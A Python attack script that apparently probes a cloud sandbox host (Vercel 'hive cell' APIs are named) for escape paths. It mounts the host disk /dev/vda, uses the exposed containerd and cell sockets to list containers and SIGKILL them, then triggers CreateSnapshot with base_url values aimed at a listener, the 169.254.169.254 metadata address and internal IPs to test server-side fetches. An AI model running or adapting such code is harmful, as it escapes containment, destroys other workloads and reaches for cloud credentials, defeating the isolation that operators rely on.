# -*- coding: utf-8 -*-
"""vda47_sandbox_kill_snap: drive_id=sandbox 命中 -> 杀掉占用容器 -> 触发 CreateSnapshot -> 验证 base_url fetch 执行层
发现 (vda44): CreateSnapshot(drive_id=sandbox) 返回 'drive sandbox is still in use by a container.
                 Please call Kill() and Wait() on the container before creating a snapshot'
=> sandbox 是有效 drive_id! 只需先 Kill+Wait 容器, host 就会执行快照上传 (base_url)
本脚本:
  P1 containerd.sock gRPC: Containers/List -> 容器 ID
  P2 Tasks/Kill(SIGKILL, all) + 轮询 Get 直到退出
  P3 cell.sock CreateSnapshot(sandbox) base_url 变体 + guest 监听 18080 观测执行层
  P4 若仍 'in use', 尝试 cell.sock ContainersService/Kill + Wait
输出落盘 + 哨兵 V47D_DONE"""
import os, time, socket, ctypes, subprocess, threading, re

OUT = '/vercel/sandbox/v47.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=5):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:400].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def grpc_call(sockpath, service, req_bytes, t=10):
    """curl --http2-prior-knowledge --unix-socket 调 gRPC, 返回 (rc, stdout, stderr)"""
    tmp = '/tmp/grpc_req.bin'
    try:
        with open(tmp, 'wb') as fp:
            fp.write(b'\x00' + len(req_bytes).to_bytes(4, 'big') + req_bytes)
        r = subprocess.run(
            ['curl', '--http2-prior-knowledge', '-s', '--unix-socket', sockpath,
             '-H', 'content-type: application/grpc', '-H', 'te: trailers',
             '--data-binary', '@' + tmp, 'http://localhost' + service],
            capture_output=True, timeout=t)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b'', str(e).encode()


def pb_str(field_no, s):
    tag = field_no << 3 | 2
    b = bytes([tag]) + bytes([len(s)]) + s.encode()
    return b


def pb_uint(field_no, v):
    tag = field_no << 3 | 0
    out = bytearray([tag])
    while v >= 0x80:
        out.append((v & 0x7f) | 0x80)
        v >>= 7
    out.append(v)
    return bytes(out)


def pb_bool(field_no, v):
    return bytes([field_no << 3 | 0, 1 if v else 0])


LISTEN = []
DONE = threading.Event()


def listener(port, seconds=25):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(16)
        s.settimeout(seconds)
        t_end = time.time() + seconds
        while time.time() < t_end:
            try:
                c, addr = s.accept()
                c.settimeout(3)
                try:
                    data = c.recv(8192)
                    LISTEN.append((addr, data[:300]))
                except Exception:
                    LISTEN.append((addr, b''))
                c.close()
            except socket.timeout:
                continue
        s.close()
    except Exception as e:
        LISTEN.append(('ERR', str(e).encode()))
    DONE.set()


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    CS = '/mnt/vdax/run/cell/cell.sock'
    CD = '/mnt/vdax/run/containerd/containerd.sock'
    CSP = '/vercel.hive.cell.api.drives.v1.DrivesService/CreateSnapshot'

    # P0: 前置确认 (不 kill 时 sandbox 状态错误)
    st, bd = rpc_unix(CS, CSP, '{"drive_id":"sandbox","base_url":"s3://127.0.0.1:1/b/k"}', t=4)
    log('pre sandbox -> %s | %s' % (st, bd[:200].replace('\n', ' ')))

    # P1: containerd 容器列表
    log('=== P1 Containers/List ===')
    rc, out, err = grpc_call(CD, '/containerd.services.containers.v1.Containers/List', b'')
    log('list rc=%d out=%r err=%r' % (rc, out[:800], err[:200]))
    cids = []
    if out:
        for m in re.finditer(rb'[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}', out):
            cid = m.group().decode()
            if cid not in cids:
                cids.append(cid)
        log('container IDs: %s' % cids)

    # P2: Kill + Wait (先 containerd gRPC, 失败再 cell.sock)
    log('=== P2 Kill containers ===')
    for cid in cids:
        req = pb_str(1, cid) + pb_uint(3, 9) + pb_bool(4, True)  # SIGKILL, all
        rc, out, err = grpc_call(CD, '/containerd.services.tasks.v1.Tasks/Kill', req)
        log('kill %s rc=%d out=%r err=%r' % (cid, rc, out[:200], err[:200]))
        time.sleep(1)
    # cell.sock ContainersService/Kill 兜底
    for cid in cids:
        st, bd = rpc_unix(CS, '/vercel.hive.cell.api.containers.v1.ContainersService/Kill',
                          '{"container_id":"%s","signal":9}' % cid, t=4)
        log('cellkill %s -> %s | %s' % (cid, st, bd[:150].replace('\n', ' ')))
    time.sleep(3)

    # P3: CreateSnapshot(sandbox) + listener
    log('=== P3 CreateSnapshot after kill ===')
    PORT = 18080
    th = threading.Thread(target=listener, args=(PORT, 30))
    th.daemon = True
    th.start()
    time.sleep(1)
    urls = ['s3://127.0.0.1:%d/b/k' % PORT,
            's3://127.0.0.1:%d/test.bin' % PORT,
            's3://127.0.0.1:1/b/k',
            's3://169.254.169.254/b/k',
            's3://169.254.169.254/latest/meta-data/b/k',
            's3://172.31.0.2/b/k',
            's3://bucket.s3.amazonaws.com/key']
    for url in urls:
        body = '{"drive_id":"sandbox","base_url":"%s"}' % url
        t0 = time.time()
        st, bd = rpc_unix(CS, CSP, body, t=8)
        log('snap %-50s -> %s (%.2fs) | %s' % (url, st, time.time() - t0, bd[:250].replace('\n', ' ')))
        time.sleep(1)
    DONE.wait(32)
    log('listener hits: %s' % LISTEN)

    # P4: 若仍 in use -> cell Wait 后重试
    st, bd = rpc_unix(CS, CSP, '{"drive_id":"sandbox","base_url":"s3://127.0.0.1:1/b/k"}', t=4)
    log('post sandbox -> %s | %s' % (st, bd[:200].replace('\n', ' ')))

    log('V47D_DONE')
    f.close()


if __name__ == '__main__':
    main()
